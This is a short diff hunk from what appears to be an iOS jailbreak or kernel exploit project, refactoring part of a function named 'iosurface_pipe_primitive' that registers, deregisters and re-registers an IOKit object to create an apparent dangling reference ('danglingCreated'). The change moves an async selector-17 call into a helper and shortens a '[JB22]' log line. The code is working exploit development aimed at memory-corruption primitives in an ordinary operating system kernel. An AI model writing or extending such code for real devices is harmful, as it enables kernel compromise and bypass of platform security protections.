@@ -26936,19 +26936,10 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
                 uint64_t db18[3] = { 1, 2, 3 };
                 kern_return_t rD = sym.call(cDangle, 18, NULL, 0, db18, 24, NULL, NULL, NULL, NULL);
 
-                uint64_t reregOut[4] = {0};
-                uint32_t reregOutCnt = 4;
-                uint64_t bufRR[3] = { in3[0], in3[1], in3[2] };
-                uint64_t ref = 0x1122334455667788ULL;
-                mach_port_t wp = MACH_PORT_NULL;
-                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
-                kern_return_t rRR = asyncCall(cDangle, 17, wp, &ref, 1,
-                    NULL, 0, bufRR, 24,
-                    reregOut, &reregOutCnt, NULL, NULL);
-                mach_port_mod_refs(mach_task_self(), wp, MACH_PORT_RIGHT_RECEIVE, -1);
+                kern_return_t rRR = jb20_call_sel(cDangle, 17, in3, 24, calibShape, asyncCall, sym.call);
 
-                log([NSString stringWithFormat:@"[JB22] V_REPLANT reg=0x%x dereg=0x%x rereg=0x%x outCnt=%u out=[0x%llx,0x%llx,0x%llx,0x%llx]",
-                     rR, rD, rRR, reregOutCnt, reregOut[0], reregOut[1], reregOut[2], reregOut[3]]);
+                log([NSString stringWithFormat:@"[JB22] V_REPLANT reg=0x%x dereg=0x%x rereg=0x%x",
+                     rR, rD, rRR]);
 
                 if (rR == KERN_SUCCESS && rD == KERN_SUCCESS && rRR == KERN_SUCCESS) {
                     danglingCreated = 1;
